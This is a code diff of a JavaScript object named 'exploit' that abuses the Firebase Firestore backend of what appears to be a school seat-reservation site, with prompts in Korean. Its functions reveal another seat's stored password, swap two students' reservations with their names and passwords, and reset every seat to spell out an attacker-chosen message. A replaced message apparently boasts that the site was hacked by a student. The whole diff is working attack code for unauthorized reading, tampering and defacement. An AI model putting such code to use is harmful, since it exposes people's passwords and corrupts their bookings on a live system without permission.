@@ -66,7 +66,7 @@ const exploit = {
             },500);
         }
     },
-
+    
     setPassword : function() { 
         db = firebase.firestore();
         ymd = window.location.search.substring(6, 14);
@@ -128,14 +128,59 @@ const exploit = {
         db = firebase.firestore();
         ymd = window.location.search.substring(6, 14);
         time = window.location.search[20];
-        console.log(ymd+'-'+time);
         var zali = prompt('자리 번호를 입력하세요...');
         var bool = confirm('자리 : ' + zali + ' 가 맞습니까?')
         if (bool) { 
             db.collection("product1").doc(ymd+'-'+time).get().then((result) => {
                 var pw = result.data()[zali][3];
-                console.log(pw);
                 alert('비밀번호는 ' + pw + ' 입니다.')
+            });
+        }
+    },
+
+    change: function() {
+        db = firebase.firestore();
+        ymd = window.location.search.substring(6, 14);
+        time = window.location.search[20];
+        var zali1 = prompt('현재 자리 번호를 입력하세요...');
+        var zali2 = prompt('바꿀 자리 번호를 입력하세요...');
+        var bool = confirm(zali1 + ' 자리와 ' + zali2 + ' 자리를 바꾸시겠습니까?');
+        if (bool) { 
+            db.collection("product1").doc(ymd+'-'+time).get().then((result) => {
+                var zali1_class = result.data()[zali1][0];
+                var zali1_num = result.data()[zali1][1];
+                var zali1_name = result.data()[zali1][2];
+                var zali1_password = result.data()[zali1][3];
+                var zali2_class = result.data()[zali2][0];
+                var zali2_num = result.data()[zali2][1];
+                var zali2_name = result.data()[zali2][2];
+                var zali2_password = result.data()[zali2][3];
+                if(zali1_num.length == 1) {
+                    var zali1_stunum = '1' + zali1_class + '0' + zali1_num;
+                }
+                else {
+                    var zali1_stunum = '1' + zali1_class + zali1_num;
+                }
+                if(zali2_num.length == 1) {
+                    var zali2_stunum = '1' + zali2_class + '0' + zali2_num;
+                }
+                else {
+                    var zali2_stunum = '1' + zali2_class + zali2_num;
+                }
+
+                var save = {
+                    [zali1]: [zali2_class, zali2_num, zali2_name, zali2_password],
+                    [zali2]: [zali1_class, zali1_num, zali1_name, zali1_password],
+                    _MAP: {
+                        [zali1_stunum]: 1,
+                        [zali2_stunum]: 1
+                    }
+                };
+                db.collection('product1').doc(ymd+'-'+time).update(save);
+    
+                setTimeout(() => {
+                    location.reload();
+                }, 500);
             });
         }
     },
@@ -144,18 +189,34 @@ const exploit = {
         db = firebase.firestore();
         ymd = window.location.search.substring(6, 14);
         time = window.location.search[20];
+        var string = prompt('입력하고 싶은 멘트를 입력하세요...(36자 제한)');
+        var string_finish = [];
+        var zali_arr = ['A1', 'A2', 'B1', 'B2', 'A3', 'A4', 'B3', 'B4', 'A5', 'A6', 'B5', 'B6', 'C1', 'C2', 'D1', 'D2', 'C3', 'C4', 'D3', 'D4', 'C5', 'C6', 'D5', 'D6', 'E1', 'E2', 'F1', 'F2', 'E3', 'E4', 'F3', 'F4', 'E5', 'E6', 'F5', 'F6'];
+        for(i=0; i<36; i++) { 
+            if(i < string.length) { 
+                string_finish[i] = string[i];
+            }
+            else {
+                string_finish[i] = "";
+            }
+        };
         var save = {
-            A1:["0", "0", "인", "0"], A2:["0", "0", "천", "0"], A3:["0", "0", "고", "0"], A4:["0", "0", "노", "0"], A5:["0", "0", "자", "0"], A6:["0", "0", "리", "0"], 
-            B1:["0", "0", "과", "0"], B2:["0", "0", "학", "0"], B3:["0", "0", "면", "0"], B4:["0", "0", "실", "0"], B5:["0", "0", "신", "0"], B6:["0", "0", "청", "0"], 
-            C1:["0", "0", "사", "0"], C2:["0", "0", "이", "0"], C3:["0", "0", "학", "0"], C4:["0", "0", "생", "0"], C5:["0", "0", "다", "0"], C6:["0", "0", "털", "0"], 
-            D1:["0", "0", "트", "0"], D2:["0", "0", "중", "0"], D3:["0", "0", "한", "0"], D4:["0", "0", "테", "0"], D5:["0", "0", "렸", "0"], D6:["0", "0", "죠", "0"], 
-            E1:["0", "0", "ㅋ", "0"], E2:["0", "0", "ㅋ", "0"], E3:["0", "0", "ㅋ", "0"], E4:["0", "0", "ㅋ", "0"], E5:["0", "0", "ㅋ", "0"], E6:["0", "0", "ㅋ", "0"], 
-            F1:["0", "0", "ㅋ", "0"], F2:["0", "0", "ㅋ", "0"], F3:["0", "0", "ㅋ", "0"], F4:["0", "0", "ㅋ", "0"], F5:["0", "0", "ㅋ", "0"], F6:["0", "0", "ㅋ", "0"], 
+            A1:["", "", "", ""], A2:["", "", "", ""], A3:["", "", "", ""], A4:["", "", "", ""], A5:["", "", "", ""], A6:["", "", "", ""], 
+            B1:["", "", "", ""], B2:["", "", "", ""], B3:["", "", "", ""], B4:["", "", "", ""], B5:["", "", "", ""], B6:["", "", "", ""], 
+            C1:["", "", "", ""], C2:["", "", "", ""], C3:["", "", "", ""], C4:["", "", "", ""], C5:["", "", "", ""], C6:["", "", "", ""], 
+            D1:["", "", "", ""], D2:["", "", "", ""], D3:["", "", "", ""], D4:["", "", "", ""], D5:["", "", "", ""], D6:["", "", "", ""], 
+            E1:["", "", "", ""], E2:["", "", "", ""], E3:["", "", "", ""], E4:["", "", "", ""], E5:["", "", "", ""], E6:["", "", "", ""], 
+            F1:["", "", "", ""], F2:["", "", "", ""], F3:["", "", "", ""], F4:["", "", "", ""], F5:["", "", "", ""], F6:["", "", "", ""], 
             _MAP:{
                 '1101':0, '1102':0, '1103':0, '1104':0, '1105':0, '1106':0, '1107':0, '1108':0, '1109':0, '1110':0, '1111':0, '1112':0, '1113':0, '1114':0, '1115':0, '1116':0, '1117':0, '1118':0, '1119':0, '1120':0, '1121':0, '1122':0, '1123':0, '1124':0,
                 '1201':0, '1202':0, '1203':0, '1204':0, '1205':0, '1206':0, '1207':0, '1208':0, '1209':0, '1210':0, '1211':0, '1212':0, '1213':0, '1214':0, '1215':0, '1216':0, '1217':0, '1218':0, '1219':0, '1220':0, '1221':0, '1222':0, '1223':0, '1224':0,
                 '1301':0, '1302':0, '1303':0, '1304':0, '1305':0, '1306':0, '1307':0, '1308':0, '1309':0, '1310':0, '1311':0, '1312':0, '1313':0, '1314':0, '1315':0, '1316':0, '1317':0, '1318':0, '1319':0, '1320':0, '1321':0, '1322':0, '1323':0, '1324':0,
                 '1401':0, '1402':0, '1403':0, '1404':0, '1405':0, '1406':0, '1407':0, '1408':0, '1409':0, '1410':0, '1411':0, '1412':0, '1413':0, '1414':0, '1415':0, '1416':0, '1417':0, '1418':0, '1419':0, '1420':0, '1421':0, '1422':0, '1423':0, '1424':0
+            }
+        };
+        for(i=0; i<36; i++) { 
+            if(string_finish[i] != "") {
+                save[zali_arr[i]] = ["0", "0", string_finish[i], "0"];
             }
         };
         db.collection('product1').doc(ymd+'-'+time).set(save);
